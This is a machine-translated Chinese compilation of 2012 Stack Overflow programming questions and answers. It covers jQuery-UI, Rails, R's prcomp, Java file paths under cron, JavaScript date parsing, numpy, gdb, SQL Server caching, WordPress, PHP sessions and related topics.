因为您分配到`p`inside `wrapper`，Python 将`p`inside`wrapper`视为本地到`wrapper`。在 Python 3 中，您可以使用`nonlocal p`标记`p`为从外部范围引用。在 Python 2 中，没有办法分配给中间 p，尽管您可以通过将它作为关键字参数（例如，`def decorator(fn, p=p)`）传递给嵌套函数来获得对相同值的引用。

但是，目前尚不清楚您对此有何看法。 `p`已经是本地的了`pdecor`。外部没有代码`pdecor`可以访问`p`，因此递减它不会对其他地方的任何代码产生任何影响。因此，无论您是否可以递减`p`，它都不会真正完成任何事情。

# jquery - 使用 jQuery-UI Sortable 控制占位符高度

> ID：12078289
> 
> 赞同：18
> 
> 时间：2012-08-22T17:21:11.117
> 
> 标签：jquery, html, css, jquery-ui, jquery-ui-sortable

我正在使用 jQuery-UI 可排序组件来拖动表格行。由于我的要求，我正在创建一个辅助元素来在拖动过程中保存多行。

我似乎有这个工作，但在当前拖动位置插入的空白空间只够高一行。谁能看到为什么占位符没有我拖动的内容那么高？

我尝试`style="height:auto"`在被拖动的父元素中进行设置，但这没有效果。

[我已经在http://jsfiddle.net/jCNcv/](http://jsfiddle.net/jCNcv/)的 jsFiddle 上发布了我的代码。如果您尝试将顶部的项目向下拖动，您可以看到拖动位置下方的空占位符仅足够容纳一行。

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-08-23T03:01:57.607

占位符只有一行的高度，因为每个可排序项目只有一行。您可以在开始事件期间将占位符高度设置为辅助元素的高度。

```
start: function(e, ui ){
     ui.placeholder.height(ui.helper.outerHeight());
}, 
```

更新了 jsfiddle [http://jsfiddle.net/jCNcv/2/](http://jsfiddle.net/jCNcv/2/)

# ruby-on-rails - 我找不到此错误的来源：参数数量错误（2 代表 0）

> ID：12078290
> 
> 赞同：0
> 
> 时间：2012-08-22T17:21:30.023
> 
> 标签：ruby-on-rails

当我尝试访问此控制器上的任何操作时，我不断收到：**AnnouncementsController#index 中的 ArgumentError 。**我不知道为什么。我没有向这个方法传递任何参数。这是我的行动的样子：

公告控制器#index

```
 def send

 end 
```

是的，它是空的。这是堆栈跟踪：

```
 app/controllers/anouncements_controller.rb:85:in `send'
activesupport (3.2.6) lib/active_support/callbacks.rb:81:in `run_callbacks'
actionpack (3.2.6) lib/abstract_controller/callbacks.rb:17:in `process_action'
actionpack (3.2.6) lib/action_controller/metal/rescue.rb:29:in `process_action'
actionpack (3.2.6) lib/action_controller/metal/instrumentation.rb:30:in `block in process_action'
activesupport (3.2.6) lib/active_support/notifications.rb:123:in `block in instrument'
activesupport (3.2.6) lib/active_support/notifications/instrumenter.rb:20:in `instrument'
activesupport (3.2.6) lib/active_support/notifications.rb:123:in `instrument'
actionpack (3.2.6) lib/action_controller/metal/instrumentation.rb:29:in `process_action'
actionpack (3.2.6) lib/action_controller/metal/params_wrapper.rb:206:in `process_action'
activerecord (3.2.6) lib/active_record/railties/controller_runtime.rb:18:in `process_action'
actionpack (3.2.6) lib/abstract_controller/base.rb:121:in `process'
actionpack (3.2.6) lib/abstract_controller/rendering.rb:45:in `process'
actionpack (3.2.6) lib/action_controller/metal.rb:203:in `dispatch'
actionpack (3.2.6) lib/action_controller/metal/rack_delegation.rb:14:in `dispatch'
actionpack (3.2.6) lib/action_controller/metal.rb:246:in `block in action'
actionpack (3.2.6) lib/action_dispatch/routing/route_set.rb:73:in `call'
actionpack (3.2.6) lib/action_dispatch/routing/route_set.rb:73:in `dispatch'
actionpack (3.2.6) lib/action_dispatch/routing/route_set.rb:36:in `call'
journey (1.0.4) lib/journey/router.rb:68:in `block in call'
journey (1.0.4) lib/journey/router.rb:56:in `each'
journey (1.0.4) lib/journey/router.rb:56:in `call'
actionpack (3.2.6) lib/action_dispatch/routing/route_set.rb:600:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/best_standards_support.rb:17:in `call'
rack (1.4.1) lib/rack/etag.rb:23:in `call'
rack (1.4.1) lib/rack/conditionalget.rb:25:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/head.rb:14:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/params_parser.rb:21:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/flash.rb:242:in `call'
rack (1.4.1) lib/rack/session/abstract/id.rb:205:in `context'
rack (1.4.1) lib/rack/session/abstract/id.rb:200:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/cookies.rb:338:in `call'
activerecord (3.2.6) lib/active_record/query_cache.rb:64:in `call'
activerecord (3.2.6) lib/active_record/connection_adapters/abstract/connection_pool.rb:473:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/callbacks.rb:28:in `block in call'
activesupport (3.2.6) lib/active_support/callbacks.rb:405:in `_run__476788422__call__40344208__callbacks'
activesupport (3.2.6) lib/active_support/callbacks.rb:405:in `__run_callback'
activesupport (3.2.6) lib/active_support/callbacks.rb:385:in `_run_call_callbacks'
activesupport (3.2.6) lib/active_support/callbacks.rb:81:in `run_callbacks'
actionpack (3.2.6) lib/action_dispatch/middleware/callbacks.rb:27:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/reloader.rb:65:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/remote_ip.rb:31:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/debug_exceptions.rb:16:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
railties (3.2.6) lib/rails/rack/logger.rb:26:in `call_app'
railties (3.2.6) lib/rails/rack/logger.rb:16:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/request_id.rb:22:in `call'
rack (1.4.1) lib/rack/methodoverride.rb:21:in `call'
rack (1.4.1) lib/rack/runtime.rb:17:in `call'
activesupport (3.2.6) lib/active_support/cache/strategy/local_cache.rb:72:in `call'
rack (1.4.1) lib/rack/lock.rb:15:in `call'
actionpack (3.2.6) lib/action_dispatch/middleware/static.rb:62:in `call'
railties (3.2.6) lib/rails/engine.rb:479:in `call'
railties (3.2.6) lib/rails/application.rb:220:in `call'
rack (1.4.1) lib/rack/content_length.rb:14:in `call'
railties (3.2.6) lib/rails/rack/log_tailer.rb:17:in `call'
rack (1.4.1) lib/rack/handler/webrick.rb:59:in `service'
/home/edu/.rvm/rubies/ruby-1.9.2-p290/lib/ruby/1.9.1/webrick/httpserver.rb:111:in `service'
/home/edu/.rvm/rubies/ruby-1.9.2-p290/lib/ruby/1.9.1/webrick/httpserver.rb:70:in `run'
/home/edu/.rvm/rubies/ruby-1.9.2-p290/lib/ruby/1.9.1/webrick/server.rb:183:in `block in start_thread' 
```

有谁知道发生了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T17:24:21.930

是的，send 是 Ruby 中的保留字，将 send 改为 mysend

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T17:26:23.470

send 可能是保留字 [http://oldwiki.rubyonrails.org/rails/pages/ReservedWords](http://oldwiki.rubyonrails.org/rails/pages/ReservedWords)

# r - 即使允许使用 NA，R 函数 prcomp 也会因 NA 的值而失败

> ID：12078291
> 
> 赞同：29
> 
> 时间：2012-08-22T17:21:47.760
> 
> 标签：r, pca, na

我正在使用该函数`prcomp`来计算前两个主成分。但是，我的数据有一些 NA 值，因此该函数会引发错误。即使在帮助文件中提到了 na.action 定义似乎也不起作用`?prcomp`

这是我的例子：

```
d <- data.frame(V1 = sample(1:100, 10), V2 = sample(1:100, 10))

prcomp(d, center = TRUE, scale = TRUE, na.action = na.omit)

d$V1[5] <- NA
d$V2[7] <- NA

prcomp(d, center = TRUE, scale = TRUE, na.action = na.omit) 
```

我正在为 Mac OS X 使用最新的 R 版本 2.15.1。

任何人都可以看到`prcomp`失败的原因吗？

这是我的新示例：

```
d <- data.frame(V1 = sample(1:100, 10), V2 = sample(1:100, 10))

result <- prcomp(d, center = TRUE, scale = TRUE, na.action = na.omit)

result$x

d$V1[5] <- NA

result <- prcomp(~V1+V2, data=d, center = TRUE, scale = TRUE, na.action = na.omit)

result$x 
```

是否可以在 PC1 和 PC2 中保留第 5 行？在我的真实数据集中，我当然有超过两列的变量，只有其中一些丢失了，我不想丢失隐藏在其他值中的剩余信息！

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-22T17:47:45.947

如果您不愿意使用公式界面，另一种解决方案是

```
prcomp(na.omit(d), center = TRUE, scale = TRUE) 
```

其中包括`na.omit`直接应用于数据框。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-08-22T17:31:21.947

是的，它看起来像一个“功能”（错误），`na.action`除非您使用该`formula`界面，否则它会被完全忽略。这已经[在 R 开发列表中提到过](http://r.789695.n4.nabble.com/na-omit-option-in-prcomp-formula-interface-only-td4373533.html)。

我认为这应该被记录或标记为错误。

为了清楚起见，这会起作用，因为它访问公式界面：

```
prcomp(~V1+V2, data=d, center = TRUE, scale = TRUE, na.action = na.omit) 
```

# java - 跨多个操作系统删除文件

> ID：12078294
> 
> 赞同：0
> 
> 时间：2012-08-22T17:22:05.393
> 
> 标签：java, linux, cron, cross-compiling

所以我有一个运行类似于以下内容的程序

```
public class SHandler extends Handler { 
    File lmpFile; 
```

在程序的后面：

```
lmpFile = new File("Stuff.zip"); // This should create a file called "stuff.zip" in the present directory
OutputStream fos = new FileOutputStream(lmpFile); // Fill the file with whatever 
```

然后从我的主要我打电话

```
 S.SHandler SpecialSH = new S.SHandler(args);
 //use the object for whatever
 SpecialSH.delFile(); 
```

Delfile 是这样制作的，是类内部的一个方法：

```
public void delFile() {
    lmpFile.deleteOnExit();
    lmpXMLFile.deleteOnExit();
} 
```

据我所知，这个程序可以在我的本地机器（Windows 7 Enterprise）上运行，但是在我们的开发机器上，当我运行它时，它会扔掉很多文件，程序会把这些文件拉到所有地方。执行路径是 /usr/data/dev/Handler ，它把“stuff.zip”（以及从中提取的文件）放在 /etc/cron.d 中，尽管试图删除它们，但我无法删除它们。

*注意*该程序是通过 bash 脚本调用的，该脚本由运行 RHEL6 的机器上的 cron 作业调用。任何能够帮助这件事的人都会得到我永恒的爱和感激。

编辑： bash 脚本很简单：

```
export JAVA_HOME=/usr/data/java/current
export PATH=$JAVA_HOME/bin:$PATH

/usr/data/java/current/bin/java -jar /usr/data/dev/Handler/Handler.jar 
```

Tl;DR：文件在 Windows 上运行良好，当 RHEL6 调用 cron 时，文件最终会出现在不应该出现的地方。我怎样才能让我的程序处理这个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:30:13.977

看起来[工作目录](https://stackoverflow.com/questions/4871051/getting-the-current-working-directory-in-java)是`/etc/cron.d/`（可执行路径不同）。

相对路径（使用[java.io.File](http://docs.oracle.com/javase/1.4.2/docs/api/java/io/File.html#getAbsolutePath%28%29)时）是相对于工作目录的。如果您希望将文件放在不同的目录中，请使用绝对文件路径：（`/path/to/stuff.zip`注意前导斜杠）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:13:03.740

也许这些文件没有关闭，当删除发生时，或者其他程序使用它们？

# javascript - 将 JSON 日期字符串转换为正确的 Date 对象

> ID：12078295
> 
> 赞同：1
> 
> 时间：2012-08-22T17:22:07.370
> 
> 标签：javascript

> **可能重复：**
> [帮助在 Javascript 中解析 ISO 8601 日期](https://stackoverflow.com/questions/4829569/help-parsing-iso-8601-date-in-javascript)

我认为这应该非常简单，但结果却非常乏味。

从 WEB API，我`selected`通过 ajax 接收到对象，它的属性之一是 InspectionDate 日期时间字符串，例如`2012-05-14T00:00:00`

在 javascript 中，我使用以下代码来获得正确的日期对象

```
selected.JsInspectionDate = new Date(selected.InspectionDate); 
```

但是 JsInspectionDate 显示

```
2012/05/14 00:00 in firefox, 
2012/05/13 20:00 in chrome and 
NAN in IE9 
```

为了`2012-05-14T00:00:00.`

有人能告诉我为什么会出现这个问题吗？以及如何解决这个问题？我只想在所有浏览器的 Firefox 中显示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:42:35.100

做这个：

```
new Date(selected.InspectionDate + "Z") 
```

理由：您的日期采用[ISO 8601](http://en.wikipedia.org/wiki/ISO_8601)格式。时区指示符，如`"Z"`UTC 的一个非常短的指示符，可以工作。

**笔记！**IE 可能无法理解 ISO 8601 日期。所有的赌注都取消了。在这种情况下，最好使用[datejs](http://www.datejs.com/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T19:12:48.990

**更新：**

首先，正如有人建议的那样，我在引用 date.js 之后尝试了以下操作。

```
selected.JsInspectionDate = Date.parse(selected.InspectionDate); 
```

它似乎可以工作，但后来我发现这还不够，因为 JSON 日期字符串可以具有`2012-05-14T00:00:00.0539`date.js 也无法处理的格式。

所以我的解决方案是

```
function dateParse(str) {
    var arr = str.split('.');
    return Date.parse(arr[0]);
}
...
selected.JsInspectionDate = dateParse(selected.InspectionDate); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:55:31.647

[小提琴](http://jsfiddle.net/tF6EA/)

```
var selectedDate='2012-05-14T00:00:00';
var formatttedDate=new Date(selectedDate.substr(0,selectedDate.indexOf('T')));

document.write(formatttedDate.getFullYear()+'/'+(formatttedDate.getMonth()<10?'0'+formatttedDate.getMonth():formatttedDate.getMonth())+'/'+formatttedDate.getDay()); 
```

# jquery-ui - 将可调整大小的 jQuery 与 jquery.gantt 集成

> ID：12078296
> 
> 赞同：1
> 
> 时间：2012-08-22T17:22:26.427
> 
> 标签：jquery-ui, jquery-ui-draggable

我正在尝试使用 jquery-ui 的 resizable 组件来自定义[jquery.gantt](http://taitems.github.com/jQuery.Gantt/)中的元素。

这是我为了改变条的大小而尝试做的事情：

```
$('.ganttRed').resizable(); 
```

但是手柄不显示。我也尝试过指定该选项，`{handles: 'e,w'}`但运气不佳。我可以`draggable()`在同一个元素上毫无问题地使用。

我的jsFiddle技巧不是很好；但这是一个让你开始的尝试

[http://jsfiddle.net/BN8SY/1/](http://jsfiddle.net/BN8SY/1/)

任何建议将不胜感激。

非常感谢您的时间

# python - 访问 numpy.where 中的对象方法？

> ID：12078298
> 
> 赞同：3
> 
> 时间：2012-08-22T17:22:41.213
> 
> 标签：python, date, numpy

我有一个 numpy 数组中的数据（从 .csv 文件中读取）。np.genfromtxt 的相关摘录是：

```
dtype = [("Category", "|S10"),
         ("Status", "|S11"),
         ("Date_start", object),
         ("Date_stop", object)],
names=True,
converters={2:lambda d:datetime.strptime(d, "%d/%m/%y"),
            3:lambda d:datetime.strptime(d, "%d/%m/%y")}
) 
```

一切正常，只有一个例外——访问日期时间对象的元素。以下两行代码完全符合我的预期：

```
print inp['Date_start'][1].month #returns 7
print np.where(inp['Category'] == '"R5"') #returns an array of matching indices 
```

但下面的代码行抛出一个`AttributeError: 'numpy.ndarray' object has no attribute 'month'`

```
print np.where(inp['Date_start'].month == 7) 
```

这意味着我无法根据事情发生的月份返回结果，而我需要这样做。

有没有办法从 np.where 获得我想要的行为？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:50:43.227

您可以定义一个矢量化属性获取器：

```
def func(a):
    return a.month

vfunc = np.vectorize(func) 
```

然后使用：

```
np.where(vfunc(inp['Date_start']) == 7) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T19:05:48.787

正如您所注意到的，您`inp['Date_Start']`是一个标准`ndarray`，`dtype='object'`因此它没有其元素的属性。

除了@user545424 建议的矢量化属性获取器之外，您还可以执行以下操作：

```
test = np.fromiter((i.month == 7 for i in inp['Date_start']), 
                   count=inp.size, dtype=bool) 
```

（`count=inp.size`有助于`np.fromiter`更有效地运行。检查函数的文档）。

从那里，您可以使用`test`过滤您想要的元素，或获取满足条件的项目的索引`np.zeros(test)`。

但是，如果您有很多日期处理，您可能需要考虑使用[pandas](http://pandas.pydata.org/)，它接管了[scikits.timseries](http://pytseries.sourceforge.net/)的大部分功能。在我写这篇文章时，对 numpy 中日期的支持仍然被认为是实验性的。

# android - 更平滑的 Android 边框半径？

> ID：12078301
> 
> 赞同：1
> 
> 时间：2012-08-22T17:22:58.420
> 
> 标签：android, webkit, css, smooth

有没有改善Android浏览器边框半径的解决方法？

我搜索并搜索了有关此论点的更多问题，或者仅找到“暂时不可能”的答案，因此我想出了一个简单的也许是我想分享的解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T17:22:58.420

我需要一些技巧来让边界半径在 android 浏览器上看起来更平滑，所以我想出了这个简单而有效的解决方案。我刚刚在我的 css 类中添加了如下所示的 box-shadow：

```
-webkit-box-shadow: 0 0 1px #000; 
```

阴影的 x 和 y 位置为 0，因此阴影居中，我们只需要调整模糊值，将其扩大到角边缘上方 1px（在需要的基础上），使它们看起来更平滑。当然，阴影颜色必须与圆角元素的背景/边框颜色相同……</p>

将这行代码添加到您的 css 中有一个小问题：是的……它将针对所有 -webkit 浏览器，使边框半径看起来（稍微）不那么清晰。

现在，如果你是那种可以使用小幅妥协的设计师，它应该适合你，但如果你像我一样是一个挑剔的怪胎，你绝对应该找到一种方法将你的 CSS 定位到特定的设备。

在我写这篇文章的时候，我还没有想到完美的解决方案，但是你可以很好地利用媒体查询来限制你使用“最大宽度”属性的规则（限制基于设备的范围它们的屏幕宽度至少可以防止 webkit 桌面浏览器）或“-webkit-device-pixel-ratio”根据像素密度针对不同的 android 设备：

```
@media only screen and (-webkit-device-pixel-ratio:.75){
/*for low density (ldpi) Android layouts */
}

@media only screen and (-webkit-device-pixel-ratio:1){
/*for low density (ldpi) Android layouts */
}

@media only screen and (-webkit-device-pixel-ratio:1.5){
/*for low density (ldpi) Android layouts */
} 
```

最好的尊重和良好的设计给大家。希望我帮助了一些绝望的 android 边界半径痴迷设计师 ;)

# debugging - 无法在 .gdbinit 中设置挂起的断点

> ID：12078313
> 
> 赞同：1
> 
> 时间：2012-08-22T17:23:44.867
> 
> 标签：debugging, gdb, gdbinit

gdb-6.8

如果未加载程序或库，手动设置挂起断点的工作很奇怪，但不能通过`.gdbinit`. 有什么问题？

[手动方式]

```
(gdb) break foo.cc:111
No source file named foo.cc.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 1 (foo.cc) pending.
(gdb) info break
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   <PENDING>          foo.cc
(gdb) run myprogram 
```

[gdbinit方式] 将这两行加入`.gdbinit`

```
 set breakpoint pending on
   break foo.cc:111 
```

Gdb 在启动时显示以下错误。

```
> gdb myprogram
(enter gdb shell)
/home/<username>/.gdbinit:2: Error in sourced command file:
No symbol table is loaded.  Use the "file" command. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:51:21.973

这是 2008 年修复的错误，请尝试升级您的 gdb 或使用/移植以下修复该问题的补丁。

[尚未加载任何符号的挂起断点](http://sourceware.org/ml/gdb-patches/2008-04/msg00076.html)

# sql - SQL 是否知道“缓存”值，或者第二个查询将跨越整个管道？

> ID：12078316
> 
> 赞同：0
> 
> 时间：2012-08-22T17:23:58.450
> 
> 标签：sql, sql-server, caching

`UPDATE [User] SET SellerRating = SellerRating + {0} WHERE Id='{1}'; SELECT SellerRating FROM [User] WHERE Id='{1}'", rating, toUserId);`

当使用 SQLCommand 对象对上述查询执行标量时，
SQL Server 是否知道他手中有第二个查询的值？
还是会再次开始搜索索引？

它怎么知道？

感谢您的时间

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:36:42.117

In fact, just to be clear, the return for the SELECT may not be the same as the rows updated in the UPDATE statement.

Between the two statements, another transaction may update, insert, or delete rows in the table. As a general approach, SQL has to evaluate the second SELECT to take such changes in the data into account.

Of course, there are caveats, which are database- and configuration- specific. These statements could be inside a transaction that has write locks on the table, for instance. But, in general, the second statement has to be evaluated.

What does change, though, is that the data touched by the UPDATE statement may still be in the page cache. If so, then the SELECT should run very quickly, since there would be no cache misses.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T17:28:33.360

数据库操作彼此独立，因此不，SQL Server 不会考虑您有两个查询涉及相同行的事实。

此外，您需要参数化您的查询。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T18:44:33.467

> SQL Server 是否知道他手中有第二个查询的价值？还是会再次开始搜索索引？

世界上几乎所有受人尊敬的数据库都会 1）再次搜索**并**2）在缓存中找到行。*因此，这两个*问题的答案都是肯定的。我认为您缺少重要的知识，您必须阅读有关[缓冲池](http://msdn.microsoft.com/en-us/library/aa337525%28v=sql.105%29.aspx)及其工作原理的信息。

# ruby - Ubuntu 服务器上的 Janky

> ID：12078317
> 
> 赞同：1
> 
> 时间：2012-08-22T17:24:01.053
> 
> 标签：ruby, github, continuous-integration

我希望在 Ubuntu 服务器上安装 Janky (https://github.com/github/janky)。然而，安装指南只指定了如何在 Heroku 上安装它。

安装在 Ubuntu 上的原因是我们的 CI 服务器无法从我们的网络外部访问。

以前有没有人这样做过，或者任何人都可以指出我正确的方向。这似乎是一个 Ruby 网络应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T15:07:41.710

由于这是一个[机架应用程序](http://ruby.about.com/od/rack/a/Using-Rack.htm)，您应该能够运行

```
rackup -I lib config.ru 
```

从项目根目录。此外，由于它被设计为一个 Heroku 应用程序，因此您需要在本地配置环境变量，而不是

```
heroku config:add VARIABLE=value 
```

你会的

```
export VARIABLE=value 
```

# c# - 使用代理时如何获取谷歌结果

> ID：12078321
> 
> 赞同：1
> 
> 时间：2012-08-22T17:24:21.523
> 
> 标签：c#, visual-studio-2010, web-scraping

我已经为提交的网址制作了 C# 应用程序，该应用程序可以获取谷歌图像和文本结果。

问题是它始终适用于使用的 url，`HTTPWEBREQUEST`但是当我使用代理时它不起作用。我收到诸如 302 Document Move `or`502 Server 不可用之类的错误。

同样，如果我使用 webbrowser 控件，它可以与代理一起使用。

我确实看到了很多与我的问题有关的问题和答案，但没有一个匹配接近..

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T00:57:23.507

为我自己的问题找到了解决方案：

我们需要将 https 代理与 google 一起使用才能使其正常工作。因为这对我有用并制作适当的主机，因为我还根据不同的位置使用多个 url。

这是我的代码：

```
 public string getHtmltt(string url)
    {

        string responseData = "";
        try
        {
            string host = string.Empty;

            if (url.Contains("/search?"))
            {
                host = url.Remove(url.IndexOf("/search?"));

                if(host.Contains("//"))
                {
                    host = host.Remove(0, host.IndexOf("//")).Replace("//","").Trim();
                }
            }
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Accept = "application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
            request.AllowAutoRedirect = true;
            request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
            request.Timeout = 60000;
            request.Method = "GET";
            request.KeepAlive = false; ;

           // request.Host = "www.google.com.af";
            request.Host = host;
            request.Headers.Add("Accept-Language", "en-US");

            //request.Proxy = null;
           // WebProxy prx = new WebProxy("199.231.211.107:3128");

            WebProxy prx = new WebProxy(proxies[0].ToString().Trim());

            request.Proxy = prx;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if (response.StatusCode == HttpStatusCode.OK)
            {
                Stream responseStream = response.GetResponseStream();
                StreamReader myStreamReader = new StreamReader(responseStream);
                responseData = myStreamReader.ReadToEnd();
            }

            foreach (Cookie cook in response.Cookies)
            {
                inCookieContainer.Add(cook);
            }
            response.Close();

        }
        catch (System.Exception e)
        {
            responseData = "An error occurred: " + e.Message;

        }

        return responseData;

    } 
```

到目前为止它的工作gr8。

# wordpress - 当 wp home 和 site home 不同时，wordpress the_permalink() 会中断

> ID：12078323
> 
> 赞同：0
> 
> 时间：2012-08-22T17:24:47.220
> 
> 标签：wordpress

我有一个安装在子文件夹中的 Wordpress 网站。如果我使用默认设置，即常规设置的 WordPress 地址和站点地址字段中的条目相同，例如`http://localhost/mysite/wordpress`，一切都很好。但是，如果我`http://localhost/mysite`将站点地址更改为站点根目录（`http://localhost/mysite/?p=181``http://localhost/mysite/wordpress/?p=181`

我怎样才能解决这个问题？

谢谢 - 乔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T21:56:02.947

我在想，从你所说的来看，这是你的 .htaccess。

您需要将子目录添加到 RewriteBase 和 RewriteRule。

因此，将以下两行替换为普通的 WordPress SEO 永久链接 htaccess 之类的；

```
RewriteBase /your-subdirectory/ 
```

和：

```
RewriteRule . /your-subdirectory/index.php [L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T22:24:20.367

更改站点地址后，您必须将 .htaccess 和 index.php 文件**复制**到一个目录（在您的情况下，将它们复制到 [code]http://localhost/mysite/[/code]）然后编辑索引.php 文件替换

```
require('./wp-blog-header.php'); 
```

和

```
require('./wordpress/wp-blog-header.php'); 
```

[您可以在http://codex.wordpress.org/Giving_WordPress_Its_Own_Directory#Using_a_pre-existing_subdirectory_install](http://codex.wordpress.org/Giving_WordPress_Its_Own_Directory#Using_a_pre-existing_subdirectory_install)找到有关如何执行此操作的完整说明

# android - Ant/Emma 检测 Android SDK

> ID：12078324
> 
> 赞同：0
> 
> 时间：2012-08-22T17:24:51.170
> 
> 标签：android, ant, code-coverage, emma

我目前正在尝试测试 Android SDK/API，并为此创建了一个应用程序，该应用程序利用 API 中的 SQLite 类以及运行该应用程序的测试。我一直在拼命寻找 SDK 的代码覆盖率，以便我可以分析我的测试并为我的项目获得一些实际结果。但是，我似乎找不到任何文档（甚至堆栈溢出问题）可以为我提供任何帮助来执行此操作。我一直在玩 EMMA（还有一段时间 Ant，虽然显然我的 Android 版本中的版本不够用，单独下载对我来说并不顺利）。我之前发现[了这个](https://stackoverflow.com/questions/9419331/emma-code-coverage-for-a-lib-on-android)问题，但我没有得到他们的解决方案。

谁能帮我？谢谢。

编辑：我尝试从前面的链接的链接中添加代码（它正在将代码添加到 EMMA 的 build.xml 和 ant.properties），但现在我什至不知道覆盖日志的存储位置，如果它甚至像我一样工作认为它可能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:30:15.483

[我使用EclEmma](http://www.eclemma.org/)在我的 Android 项目上运行代码覆盖率。我的单元测试设置为使用[Robolectric](http://pivotal.github.com/robolectric/)运行。我没有使用 Ant 来管理我的 Android 构建，但是让它与这些一起工作应该不难。

# ios - iPhone ALAAssets：资产可以被破坏性编辑吗？

> ID：12078325
> 
> 赞同：1
> 
> 时间：2012-08-22T17:25:02.790
> 
> 标签：ios, alassetslibrary

查看[ALAssetsLibrary API](http://developer.apple.com/library/ios/#DOCUMENTATION/AssetsLibrary/Reference/ALAssetsLibrary_Class/Reference/Reference.html)，我看到了一些创建新资产的方法： `writeImageDataToSavedPhotosAlbum:metadata:completionBlock:` `writeImageToSavedPhotosAlbum:metadata:completionBlock:` `writeImageToSavedPhotosAlbum:orientation:completionBlock:` `writeVideoAtPathToSavedPhotosAlbum:completionBlock:`

这些似乎表明您应该只创建新资产。不过我的问题是：有没有办法对资产进行破坏性编辑？还是您总是为编辑创建新图像？我希望是后者，因为我希望每个资产都被视为唯一的、仅创建一次的资产。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:58:38.307

I have found no possible way to remove or alter assets in the library. Its kind of a pain when I create items in the assets library and I cannot remove them. But that appears to be apples wishes. Most likely because they do not want an app to be able to delete images and videos from the users library. Only by going to the camera app or another "Apple" app will the asset be able to be removed.

I kind of wish they would let you popup a delete confirmation window for an asset to let the user decide on a (apple created) confirmation page.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-29T04:19:13.277

我还没有尝试过，但从 iOS 5 开始，如果图像被标记为可编辑（仅当图像最初是由您的应用程序创建的），似乎可以使用`setImageData`on 方法编辑图像：`ALAsset`

[http://developer.apple.com/library/ios/#documentation/AssetsLibrary/Reference/ALAsset_Class/Reference/Reference.html#//apple_ref/occ/instm/ALAsset/setImageData:metadata:completionBlock](http://developer.apple.com/library/ios/#documentation/AssetsLibrary/Reference/ALAsset_Class/Reference/Reference.html#//apple_ref/occ/instm/ALAsset/setImageData:metadata:completionBlock)：

不过，似乎无法删除图像。

# php - 将数组推送到会话变量而不重新实例化变量

> ID：12078339
> 
> 赞同：0
> 
> 时间：2012-08-22T17:26:04.097
> 
> 标签：php

我正在创建一个`$item`我想推送到的数组`$_SESSION['cart']`。构建我的`item`数组后，我正在尝试：

`$_SESSION['cart'][] = $item[$item_id];`

参考： [我可以在 php 中的 SESSION 数组上使用 array_push 吗？](https://stackoverflow.com/questions/2616540/can-i-use-array-push-on-a-session-array-in-php)

但是，我的购物车会话变量不断被覆盖，而不是被添加到。还有其他建议吗？

根据马克的要求：

第一次运行：

```
Notice: Undefined variable: _SESSION in C:\inetpub\wwwroot\domain\store\cart.php on line 5
NULL array(3) { ["title"]=> string(37) "PA State and Federal Laminated Poster" ["price"]=> string(5) "55.95" ["qty"]=> string(1) "3" } 
```

第二次：

```
Notice: Undefined variable: _SESSION in C:\inetpub\wwwroot\domain\store\cart.php on line 5
NULL array(3) { ["title"]=> string(53) "PA State and Federal Laminated Poster SPANISH Edition" ["price"]=> string(5) "55.95" ["qty"]=> string(1) "1" } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:33:45.943

`session_start()`您必须在参考之前致电`$_SESSION`。您发布的输出表明您不这样做。

> 注意：未定义变量：第 5 行 C:\inetpub\wwwroot\domain\store\cart.php 中的 _SESSION

# sql - 有没有办法在 SSAS 中搜索所有属性

> ID：12078341
> 
> 赞同：0
> 
> 时间：2012-08-22T17:26:07.260
> 
> 标签：sql, visual-studio, ssas, mdx

